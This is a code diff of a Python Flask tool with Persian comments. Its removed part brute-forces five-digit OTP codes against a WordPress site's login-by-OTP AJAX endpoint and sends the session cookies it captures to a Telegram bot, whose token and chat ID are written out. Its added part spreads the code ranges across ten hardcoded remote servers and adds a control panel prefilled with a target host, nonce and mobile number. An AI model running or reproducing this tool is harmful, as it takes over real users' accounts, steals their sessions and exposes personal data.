@@ -1,240 +1,301 @@
 import requests
-import json
-from http.cookiejar import MozillaCookieJar
-from concurrent.futures import ThreadPoolExecutor
-import time
-import sys
-from flask import Flask, render_template_string, request, jsonify
+from flask import Flask, render_template_string, request
 from flask_socketio import SocketIO, emit
 import threading
-import os
-from datetime import datetime
-from flask_cors import CORS  # اضافه کردن CORS
-
-# تنظیمات تلگرام
-TELEGRAM_BOT_TOKEN = "5858689331:AAH3pdfEDVSIF9AaPsWCGQiZzltgkKVtKr8"
-TELEGRAM_CHAT_ID = "-1002021960039"
+import time
 
 app = Flask(__name__)
 socketio = SocketIO(app)
-CORS(app)  # فعال کردن CORS برای همه مسیرها
 
-# متغیرهای گلوبال برای کنترل پروسه و وضعیت
-running = False
-found_success = False
+REMOTE_SERVERS = [
+    "http://63.142.254.127:5000",
+    "http://63.142.246.30:5000",
+    "http://185.189.27.75:5000",
+    "http://185.189.27.62:5000",
+    "http://185.185.126.164:5000",
+    "http://104.251.211.205:5000",
+    "http://185.189.27.11:5000",
+    "http://185.183.182.217:5000",
+    "http://185.183.182.137:5000",
+    "http://104.251.219.67:5000",
+]
+
+RANGES = [
+    (0, 10000),
+    (10000, 20000),
+    (20000, 30000),
+    (30000, 40000),
+    (40000, 50000),
+    (50000, 60000),
+    (60000, 70000),
+    (70000, 80000),
+    (80000, 90000),
+    (90000, 99999),
+]
+
 progress_log = []
-current_status = {
-    "running": False,
-    "current_range": {"start": 0, "end": 0},
-    "processed": 0,
-    "error": None
-}
+found_success = False
+monitoring = False
 
-# بقیه کد ورکر همون قبلیه، فقط این بخش‌ها رو تغییر می‌دیم
+def send_to_remote(server_url, host, nonce, mobile, connections, start_range, end_range):
+    """ارسال درخواست به سرور ریموت"""
+    try:
+        response = requests.post(
+            f"{server_url}/start",
+            json={"host": host, "nonce": nonce, "mobile": mobile, "connections": connections, "startRange": start_range, "endRange": end_range},
+            timeout=10
+        )
+        response.raise_for_status()
+        progress_log.append(f"Request sent to {server_url} for range {start_range}-{end_range}")
+        socketio.emit('update_progress', {'log': progress_log[-1]})
+    except requests.exceptions.RequestException as e:
+        progress_log.append(f"Failed to send request to {server_url}: {str(e)}")
+        socketio.emit('update_progress', {'log': progress_log[-1]})
 
-def send_file_to_telegram(file_path, retries=3):
-    """ارسال فایل به تلگرام با تلاش مجدد در صورت خطا"""
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
-    for attempt in range(retries):
+def stop_all_servers():
+    """توقف همه سرورها"""
+    for server in REMOTE_SERVERS:
         try:
-            if not os.path.exists(file_path):
-                progress_log.append(f"Error: File {file_path} does not exist!")
-                return False
-            with open(file_path, 'rb') as file:
-                files = {'document': file}
-                data = {'chat_id': TELEGRAM_CHAT_ID}
-                response = requests.post(url, data=data, files=files, timeout=10)
-                response.raise_for_status()
-                progress_log.append(f"File {file_path} sent to Telegram successfully!")
-                return True
-        except (requests.exceptions.RequestException, FileNotFoundError) as e:
-            progress_log.append(f"Failed to send {file_path} to Telegram (attempt {attempt + 1}/{retries}): {str(e)}")
-            if attempt < retries - 1:
-                time.sleep(2)
-    return False
-
-def save_and_send_cookies(cookies, code_str):
-    """تابع زنده برای ذخیره و ارسال کوکی‌ها"""
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    cookies_file = f"cookies_success_{code_str}_{timestamp}.txt"
-    
-    cookie_jar = MozillaCookieJar(cookies_file)
-    for cookie in cookies:
-        cookie_jar.set_cookie(cookie)
-    cookie_jar.save(ignore_discard=True, ignore_expires=True)
-    
-    if os.path.exists(cookies_file) and os.path.getsize(cookies_file) > 0:
-        progress_log.append(f"Cookies saved in {cookies_file}")
-        success = send_file_to_telegram(cookies_file)
-        if not success:
-            progress_log.append(f"Critical: Failed to send cookies {cookies_file} to Telegram after retries!")
-    else:
-        progress_log.append(f"Error: Failed to save cookies to {cookies_file}")
-
-def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=5):
-    global current_status
-    headers = {
-        "Host": host,
-        "Sec-Ch-Ua-Platform": "\"Windows\"",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Sec-Ch-Ua": "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"",
-        "Sec-Ch-Ua-Mobile": "?0",
-        "X-Requested-With": "XMLHttpRequest",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
-        "Accept": "*/*",
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "Origin": f"https://{host}",
-        "Sec-Fetch-Site": "same-origin",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Dest": "empty",
-        "Referer": f"https://{host}/login/?action=login-by-otp&mobile={mobile}",
-        "Priority": "u=1, i"
-    }
-
-    data = {
-        "login_otp_nonce": login_otp_nonce,
-        "_wp_http_referer": f"/login/?action=login-by-otp&mobile={mobile}",
-        "action": "kandopanel_login_by_otp",
-        "mobile": mobile,
-        "code[1]": str(code_values[0]),
-        "code[2]": str(code_values[1]),
-        "code[3]": str(code_values[2]),
-        "code[4]": str(code_values[3]),
-        "code[5]": str(code_values[4])
-    }
-
-    url = f"https://{host}/wp-admin/admin-ajax.php"
-    code_str = ''.join(map(str, code_values))
-
-    for attempt in range(max_retries + 1):
-        try:
-            response = requests.post(url, headers=headers, data=data, timeout=15)
-            response.raise_for_status()
-
-            try:
-                json_response = response.json()
-                if json_response.get("success"):
-                    msg = (f"Success with code {code_str} (number {counter})!\n"
-                           f"Message: {json_response['data']['message']}\n"
-                           f"Redirect to: {json_response['data']['redirect']}")
-                    progress_log.append(msg)
-                    save_and_send_cookies(response.cookies, code_str)
-
-                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                    output_file = f"success_{code_str}_{timestamp}.txt"
-                    with open(output_file, 'w', encoding='utf-8') as f:
-                        f.write(msg + f"\nCookies file: {cookies_file}\n")
-                    progress_log.append(f"Output saved in {output_file}")
-                    send_file_to_telegram(output_file)
-                    current_status["error"] = "Success found!"
-                    return True
-                else:
-                    progress_log.append(f"Failed with code {code_str} (number {counter}): {json_response}")
-                    current_status["processed"] = counter
-                    return False
-            except json.JSONDecodeError:
-                progress_log.append(f"Error parsing JSON for code {code_str} (number {counter})")
-                current_status["error"] = "JSON parsing error"
-                return False
+            requests.post(f"{server}/stop", timeout=5)
+            progress_log.append(f"Stop request sent to {server}")
+            socketio.emit('update_progress', {'log': progress_log[-1]})
         except requests.exceptions.RequestException as e:
-            error_msg = str(e)
-            if isinstance(e, requests.exceptions.HTTPError):
-                if e.response.status_code == 429:
-                    error_msg = "Rate Limit exceeded (429)"
-                elif e.response.status_code == 403:
-                    error_msg = "IP blocked by server (403)"
-                elif e.response.status_code == 503:
-                    error_msg = "Server unavailable (503)"
-            progress_log.append(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {error_msg}")
-            current_status["error"] = error_msg
-            if attempt < max_retries:
-                time.sleep(2)
-                continue
-            return False
+            progress_log.append(f"Failed to stop {server}: {str(e)}")
+            socketio.emit('update_progress', {'log': progress_log[-1]})
 
-def generate_code(counter):
-    code_str = f"{counter:05d}"
-    return [int(digit) for digit in code_str]
+def get_worker_status():
+    """جمع‌آوری وضعیت ورکرها"""
+    status_data = {}
+    for server in REMOTE_SERVERS:
+        try:
+            response = requests.get(f"{server}/status", timeout=5)
+            response.raise_for_status()
+            status = response.json()
+            status_data[server] = {
+                "running": status["running"],
+                "current_range": status["current_range"],
+                "processed": status["processed"],
+                "error": status["error"]
+            }
+            if status["error"] and "Success found!" in status["error"]:
+                global found_success
+                found_success = True
+                progress_log.append("Success found on a remote server! Stopping all servers...")
+                socketio.emit('update_progress', {'log': progress_log[-1]})
+                stop_all_servers()
+        except requests.exceptions.RequestException as e:
+            status_data[server] = {
+                "running": False,
+                "current_range": {"start": "-", "end": "-"},
+                "processed": "-",
+                "error": f"Failed to connect: {str(e)}"
+            }
+    return status_data
 
-def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_range):
-    global running, found_success, current_status
-    progress_log.append(f"Starting bruteforce from {start_range} to {end_range}...")
-    current_status = {
-        "running": True,
-        "current_range": {"start": start_range, "end": end_range},
-        "processed": start_range,
-        "error": None
-    }
-    batch_size = connections
-    found_success = False
+@app.route('/')
+def index():
+    return render_template_string('''
+    <!DOCTYPE html>
+    <html lang="fa">
+    <head>
+        <meta charset="UTF-8">
+        <title>بررسی کد OTP - سرور مرکزی</title>
+        <script src="https://cdn.tailwindcss.com"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.js"></script>
+        <style>
+            body { direction: rtl; font-family: Arial, sans-serif; }
+            .container { max-width: 1200px; margin: 0 auto; }
+            #progress-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+            #progress-table th, #progress-table td { border: 1px solid #ddd; padding: 12px; text-align: center; }
+            #progress-table th { background-color: #f2f2f2; font-weight: bold; }
+            #progress-table tr:nth-child(even) { background-color: #f9f9f9; }
+            #progress-table tr:hover { background-color: #f1f1f1; }
+            .status-active { color: green; font-weight: bold; }
+TER .status-inactive { color: red; font-weight: bold; }
+            .error-cell { color: #d9534f; max-width: 300px; word-wrap: break-word; }
+        </style>
+    </head>
+    <body class="bg-gray-100 p-8">
+        <div class="container">
+            <div class="bg-white p-8 rounded-lg shadow-lg">
+                <h1 class="text-3xl font-bold text-center mb-8">بررسی کد OTP - سرور مرکزی</h1>
+                <form id="form" class="space-y-6">
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700">هاست:</label>
+                        <input type="text" id="host" class="mt-1 block w-full p-3 border rounded-lg" value="www.arzanpanel-iran.com">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700">Nonce:</label>
+                        <input type="text" id="nonce" class="mt-1 block w-full p-3 border rounded-lg" value="9d6178e07d">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700">شماره موبایل:</label>
+                        <input type="text" id="mobile" class="mt-1 block w-full p-3 border rounded-lg" value="09039495749">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700">تعداد کانکشن‌ها:</label>
+                        <input type="number" id="connections" class="mt-1 block w-full p-3 border rounded-lg" value="20">
+                    </div>
+                    <div class="flex space-x-6">
+                        <button type="button" id="start" class="w-full bg-green-500 text-white p-3 rounded-lg hover:bg-green-600">شروع</button>
+                        <button type="button" id="stop" class="w-full bg-red-500 text-white p-3 rounded-lg hover:bg-red-600" disabled>توقف</button>
+                    </div>
+                </form>
+                <div class="mt-8">
+                    <h2 class="text-xl font-semibold text-center mb-4">وضعیت سرورها</h2>
+                    <table id="progress-table">
+                        <thead>
+                            <tr>
+                                <th>سرور</th>
+                                <th>وضعیت</th>
+                                <th>رنج فعلی</th>
+                                <th>تعداد پردازش‌شده</th>
+                                <th>خطا</th>
+                            </tr>
+                        </thead>
+                        <tbody id="table-body">
+                            <!-- جدول با AJAX پر می‌شه -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
 
-    for batch_start in range(start_range, end_range, batch_size):
-        if not running or found_success:
-            if found_success:
-                progress_log.append("Stopping: Successful code found!")
-            else:
-                progress_log.append("Process stopped manually!")
-            current_status["running"] = False
-            break
+        <script>
+            const socket = io();
+            const form = document.getElementById('form');
+            const startBtn = document.getElementById('start');
+            const stopBtn = document.getElementById('stop');
+            const tableBody = document.getElementById('table-body');
 
-        batch_end = min(batch_start + batch_size, end_range)
-        codes = [generate_code(i) for i in range(batch_start, batch_end)]
+            // لیست سرورها برای جدول
+            const servers = [
+                "http://63.142.254.127:5000",
+                "http://63.142.246.30:5000",
+                "http://185.189.27.75:5000",
+                "http://185.189.27.62:5000",
+                "http://185.185.126.164:5000",
+                "http://104.251.211.205:5000",
+                "http://185.189.27.11:5000",
+                "http://185.183.182.217:5000",
+                "http://185.183.182.137:5000",
+                "http://104.251.219.67:5000"
+            ];
 
-        with ThreadPoolExecutor(max_workers=connections) as executor:
-            futures = {
-                executor.submit(send_request, host, login_otp_nonce, mobile, code, batch_start + idx + 1): idx
-                for idx, code in enumerate(codes)
+            // آپدیت جدول با AJAX
+            function updateTable() {
+                fetch('/get_status')
+                    .then(response => response.json())
+                    .then(data => {
+                        tableBody.innerHTML = ''; // پاک کردن جدول قبلی
+                        servers.forEach(server => {
+                            const status = data[server] || {
+                                running: false,
+                                current_range: { start: '-', end: '-' },
+                                processed: '-',
+                                error: 'No data available'
+                            };
+                            const row = document.createElement('tr');
+                            row.innerHTML = `
+                                <td>${server}</td>
+                                <td class="${status.running ? 'status-active' : 'status-inactive'}">
+                                    ${status.running ? 'فعال' : 'غیرفعال'}
+                                </td>
+                                <td>${status.current_range.start} - ${status.current_range.end}</td>
+                                <td>${status.processed} / ${status.current_range.end}</td>
+                                <td class="error-cell">${status.error || '-'}</td>
+                            `;
+                            tableBody.appendChild(row);
+                        });
+                    })
+                    .catch(error => {
+                        console.error('Error fetching status:', error);
+                    });
             }
 
-            for future in futures:
-                try:
-                    if future.result():
-                        found_success = True
-                        running = False
-                        progress_log.append("Process stopped because a successful code was found!")
-                        current_status["running"] = False
-                        break
-                except Exception as e:
-                    progress_log.append(f"Exception in future: {str(e)}")
-                    current_status["error"] = str(e)
+            // هر 5 ثانیه جدول رو آپدیت کن
+            setInterval(updateTable, 5000);
+            updateTable(); // اولین بار موقع لود
 
-        current_status["processed"] = batch_end
-        if not found_success:
-            time.sleep(0.1)
+            socket.on('connect', () => {
+                console.log('Connected to WebSocket');
+            });
 
-    if not found_success:
-        progress_log.append(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
-        current_status["running"] = False
+            socket.on('update_progress', function(data) {
+                console.log('Log:', data.log);
+            });
+
+            startBtn.addEventListener('click', () => {
+                const host = document.getElementById('host').value;
+                const nonce = document.getElementById('nonce').value;
+                const mobile = document.getElementById('mobile').value;
+                const connections = document.getElementById('connections').value;
+
+                fetch('/start', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ host, nonce, mobile, connections })
+                }).then(response => {
+                    if (response.ok) {
+                        startBtn.disabled = true;
+                        stopBtn.disabled = false;
+                    } else {
+                        console.error('Start failed:', response.status);
+                    }
+                }).catch(error => console.error('Fetch error:', error));
+            });
+
+            stopBtn.addEventListener('click', () => {
+                fetch('/stop', {
+                    method: 'POST'
+                }).then(() => {
+                    startBtn.disabled = false;
+                    stopBtn.disabled = true;
+                });
+            });
+        </script>
+    </body>
+    </html>
+    ''')
 
 @app.route('/start', methods=['POST'])
 def start():
-    global running, progress_log, found_success
+    global progress_log, found_success, monitoring
     data = request.get_json()
     host = data['host']
-    login_otp_nonce = data['nonce']
+    nonce = data['nonce']
     mobile = data['mobile']
     connections = int(data['connections'])
-    start_range = int(data['startRange'])
-    end_range = int(data['endRange'])
 
-    running = True
     found_success = False
     progress_log = []
-    progress_log.append("Start button clicked!")
-    threading.Thread(target=run_bruteforce, args=(host, login_otp_nonce, mobile, connections, start_range, end_range)).start()
+    monitoring = True
+    progress_log.append("Starting distribution to remote servers...")
+    socketio.emit('update_progress', {'log': progress_log[-1]})
+
+    threads = []
+    for i, server in enumerate(REMOTE_SERVERS):
+        start_range, end_range = RANGES[i]
+        thread = threading.Thread(target=send_to_remote, args=(server, host, nonce, mobile, connections, start_range, end_range))
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
+
     return '', 204
 
 @app.route('/stop', methods=['POST'])
 def stop():
-    global running
-    running = False
-    progress_log.append("Stop button clicked!")
+    global progress_log, monitoring
+    monitoring = False
+    stop_all_servers()
     return '', 204
 
-@app.route('/status', methods=['GET'])
-def status():
-    """برگشت وضعیت فعلی ورکر"""
-    return jsonify(current_status)
+@app.route('/get_status', methods=['GET'])
+def get_status():
+    """برگشت وضعیت ورکرها به صورت JSON"""
+    return jsonify(get_worker_status())
 
 if __name__ == '__main__':
     socketio.run(app, host='0.0.0.0', port=5000, debug=True)
